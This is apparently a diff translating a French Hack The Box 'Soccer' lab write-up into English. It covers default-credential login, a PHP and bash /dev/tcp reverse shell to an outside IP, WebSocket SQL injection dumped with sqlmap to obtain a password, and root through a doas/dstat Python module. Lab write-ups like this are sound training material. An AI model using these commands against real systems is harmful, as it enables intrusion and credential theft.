@@ -1,14 +1,14 @@
-# HTB Soccer - Notes
+# HTB Soccer
 
 ## Recon
 
-- Port 80 ouvert : `nginx 1.18.0`.
-- `http://soccer.htb` redirige vers une page standard.
-- Ajout de `soccer.htb` dans `/etc/hosts`.
+- Port 80 open: `nginx 1.18.0`.
+- `http://soccer.htb` redirects to a default page.
+- Added `soccer.htb` to `/etc/hosts`.
 
-### Découverte d'un sous-domaine
+### Subdomain discovery
 
-- `gobuster dir` sur `http://soccer.htb` révèle :
+- `gobuster dir` on `http://soccer.htb` revealed:
   - `/tiny/` -> Tiny File Manager
 
 ```bash
@@ -17,18 +17,18 @@ gobuster dir -u http://soccer.htb -w /usr/share/seclists/Discovery/DNS/subdomain
 
 ## Tiny File Manager
 
-- Page de connexion identifiée comme Tiny File Manager.
-- Référence : https://github.com/prasathmani/tinyfilemanager
-- Credentials par défaut testés :
+- Login page identified as Tiny File Manager.
+- Reference: https://github.com/prasathmani/tinyfilemanager
+- Default credentials tested:
   - `admin/admin@123`
   - `user/12345`
-- Connexion réussie.
+- Login successful.
 
-### Upload de reverse shell
+### Uploading a reverse shell
 
-- La fonctionnalité d'upload fonctionne.
-- J'ai uploadé un reverse shell PHP.
-- Le shell est accessible via :
+- The upload functionality works.
+- Uploaded a PHP reverse shell.
+- The shell is accessible at:
   - `http://soccer.htb/tiny/uploads/shell.php`
 
 ### Reverse shell
@@ -38,7 +38,7 @@ nc -lvnp 4444
 bash -c '/bin/bash -i >& /dev/tcp/10.10.14.145/4444 0>&1'
 ```
 
-### Passage en pretty shell
+### Getting a nicer shell
 
 ```bash
 python3 -c 'import pty; pty.spawn("/bin/bash")'
@@ -48,22 +48,22 @@ export TERM=xterm; stty rows 38 columns 116
 reset
 ```
 
-## Shell initial
+## Initial shell
 
 ```text
 www-data@soccer:~$ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
-## Recherche de pivot vers `player`
+## Pivot to `player`
 
-- Inspection de `/home` :
-  - dossier `/home/player`
-- Avec l'utilisateur `www-data`, on cible les fichiers de configuration du serveur web.
+- Inspecting `/home`:
+  - directory `/home/player`
+- From `www-data` we focused on web server configuration files.
 
-## Analyse nginx
+## Nginx analysis
 
-Fichier trouvé : `/etc/nginx/sites-enabled/soc-player.htb`
+File found: `/etc/nginx/sites-enabled/soc-player.htb`
 
 ```nginx
 server {
@@ -84,17 +84,17 @@ server {
 }
 ```
 
-- Nouveau host détecté : `soc-player.soccer.htb`
-- Ajouté dans `/etc/hosts`.
-- Le site est accessible.
-- On peut se connecter et s'enregistrer.
-- Ticket ID en cours : `52316`
+- New host detected: `soc-player.soccer.htb`
+- Added to `/etc/hosts`.
+- The site is accessible.
+- Able to register and log in.
+- Current Ticket ID: `52316`
 
 ## WebSocket / SQL injection
 
-- Une WebSocket est présente sur `ws://soc-player.soccer.htb:9091`.
-- Payload initial : `{"id":"81832"}`.
-- Test manuel avec `wscat` :
+- A WebSocket is present at `ws://soc-player.soccer.htb:9091`.
+- Initial payload: `{"id":"81832"}`.
+- Manual test with `wscat`:
 
 ```bash
 wscat -c ws://soc-player.soccer.htb:9091
@@ -104,50 +104,50 @@ wscat -c ws://soc-player.soccer.htb:9091
 < Ticket Doesn't Exist
 ```
 
-- Injection SQL confirmée.
+- SQL injection confirmed.
 
 ## sqlmap
 
-### Détection
+### Detection
 
 ```bash
 sqlmap -u 'ws://soc-player.soccer.htb:9091' --data '{"id":"*"}'
 ```
 
-- DBMS détecté : MySQL >= 5.0.12
-- Injection de type : time-based blind
+- DBMS detected: MySQL >= 5.0.12
+- Injection type: time-based blind
 
-### Liste des bases
+### List databases
 
 ```bash
 sqlmap -u 'ws://soc-player.soccer.htb:9091' --data '{"id":"*"}' --dbs
 ```
 
-- Bases identifiées :
+- Databases found:
   - `information_schema`
   - `mysql`
   - `performance_schema`
   - `soccer_db`
   - `sys`
 
-### Dump de la base `soccer_db`
+### Dump `soccer_db`
 
 ```bash
 sqlmap -u 'ws://soc-player.soccer.htb:9091' --data '{"id":"*"}' -D soccer_db --dump
 ```
 
-- Table trouvée : `accounts`
-- Colonnes : `id`, `username`, `email`, `password`
-- Entrée :
-  - `email` : `player@player.htb`
-  - `username` : `player`
-  - `password` : `PlayerOftheMatch2022`
+- Table found: `accounts`
+- Columns: `id`, `username`, `email`, `password`
+- Entry:
+  - `email`: `player@player.htb`
+  - `username`: `player`
+  - `password`: `PlayerOftheMatch2022`
 
 ## SSH player
 
-- Credentials listées dans la base : `player@player.htb / PlayerOftheMatch2022`
-- SSH fonctionne.
-- Aucun accès `sudo` pour `player` :
+- Credentials from the DB: `player@player.htb / PlayerOftheMatch2022`
+- SSH works.
+- No `sudo` for `player`:
 
 ```bash
 player@soccer:~$ sudo -l
@@ -155,30 +155,30 @@ player@soccer:~$ sudo -l
 Sorry, user player may not run sudo on localhost.
 ```
 
-## Linpeas et escalation de privilèges
+## LinPEAS and privilege escalation
 
-- Transfert de `linpeas.sh` vers la machine :
+- Transferred `linpeas.sh` to the box:
 
 ```bash
 sudo scp Tools/linpeas.sh player@soccer.htb:/tmp/
 ```
 
-- Résultat intéressant de linpeas :
-  - SUID `doas` trouvé : `/usr/local/bin/doas`
-  - Configuration `doas.conf` autorise :
+- linPEAS findings:
+  - SUID `doas` found: `/usr/local/bin/doas`
+  - `doas.conf` allows:
     - `permit nopass player as root cmd /usr/bin/dstat`
 
 ```bash
 -rwsr-xr-x 1 root root 42224 Nov 17 2022 /usr/local/bin/doas
 ```
 
-- `doas` peut exécuter `dstat` en tant que root sans mot de passe.
-- `dstat` est listé avec un répertoire `/usr/local/share/dstat` contenant un module `exploit`.
+- `doas` can run `dstat` as root without a password.
+- `dstat` has `/usr/local/share/dstat` containing a module `exploit`.
 
-### Exploitation `dstat`
+### Exploiting `dstat`
 
-- GTFObins pour `dstat` permet d’obtenir un shell root via un module ou un import Python.
-- Exemple d'exploitation :
+- GTFObins for `dstat` can yield a root shell via a module or Python import.
+- Example exploit:
 
 ```bash
 player@soccer:/usr/local/share/dstat$ cat dstat_exploit.py
@@ -187,7 +187,7 @@ import os; os.system('/bin/bash -p')
 player@soccer:/usr/local/share/dstat$ doas /usr/bin/dstat --exploit
 ```
 
-- Après exploitation :
+- After exploitation:
 
 ```text
 root@soccer:/usr/local/share/dstat# id
@@ -196,7 +196,7 @@ uid=0(root) gid=0(root) groups=0(root)
 
 ## Root
 
-- Contenu des flags :
+- Flags:
 
 ```bash
 player@soccer:/usr/local/share/dstat$ doas /usr/bin/dstat --exploit
@@ -212,10 +212,10 @@ root@soccer:/usr/local/share/dstat# cat /home/player/user.txt
 
 ## Conclusion
 
-- Accès initial via Tiny File Manager.
-- Passage à shell `www-data` obtenu.
-- Découverte de `soc-player.soccer.htb` dans la config nginx.
-- Exploitation WebSocket SQLi pour récupérer les credentials `player`.
-- SSH `player` obtenu.
-- Linpeas a aidé à identifier `doas` et `dstat`.
-- Root obtenu via `doas /usr/bin/dstat --exploit`.
+- Initial access via Tiny File Manager.
+- Gained `www-data` shell.
+- Discovered `soc-player.soccer.htb` in nginx config.
+- Exploited WebSocket SQLi to retrieve `player` credentials.
+- SSH as `player` obtained.
+- linPEAS helped identify `doas` and `dstat`.
+- Root obtained via `doas /usr/bin/dstat --exploit`.
